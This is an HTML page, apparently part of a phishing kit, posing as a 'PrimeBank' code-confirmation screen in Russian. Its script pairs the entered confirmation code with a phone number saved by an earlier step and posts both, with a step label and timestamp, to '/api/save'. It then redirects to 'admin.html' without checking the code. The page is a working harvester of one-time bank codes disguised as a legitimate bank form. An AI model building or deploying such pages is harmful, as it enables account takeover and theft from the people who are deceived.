<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PrimeBank — Подтверждение</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin:0;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
  font-family: Roboto, sans-serif;
}

.auth-container {
  background:#fff;
  width:100%;
  max-width:420px;
  padding:32px;
  border-radius:16px;
  box-shadow:0 20px 40px rgba(0,0,0,0.15);
}

.auth-container h2 {
  margin-top:0;
  margin-bottom:24px;
  text-align:center;
}

form {
  width:100%;
}

input {
  width:100%;
  padding:12px 14px;
  margin-bottom:16px;
  border-radius:8px;
  border:1px solid #ccc;
  font-size:15px;
}

button {
  width:100%;
  padding:14px;
  border:none;
  border-radius:10px;
  background:#203a43;
  color:#fff;
  font-size:16px;
  cursor:pointer;
  transition:0.3s;
}

button:hover {
  background:#162b33;
}

.error {
  margin-top:12px;
  font-size:14px;
  color:red;
  display:none;
  text-align:center;
}
</style>
</head>
<body>

<div class="auth-container">
  <h2>Введите код</h2>
  <form id="codeForm">
    <input type="text" id="codeInput" placeholder="Код подтверждения" required>
    <button type="submit">Подтвердить</button>
    <div class="error" id="errorMsg"></div>
  </form>
</div>

<script>
const form = document.getElementById("codeForm");
const codeInput = document.getElementById("codeInput");
const errorMsg = document.getElementById("errorMsg");

form.addEventListener("submit", async function(e){
  e.preventDefault();

  const code = codeInput.value.trim();
  const phone = localStorage.getItem("authPhone");

  if(!phone){
    errorMsg.textContent = "Телефон не найден";
    errorMsg.style.display = "block";
    return;
  }

  try {
    const response = await fetch("/api/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        phone: phone,
        code: code,
        step: "code",
        date: new Date().toISOString()
      })
    });

    if(!response.ok){
      throw new Error();
    }

    window.location.href = "admin.html";

  } catch(err){
    errorMsg.textContent = "Ошибка сервера";
    errorMsg.style.display = "block";
  }
});
</script>

</body>
</html>
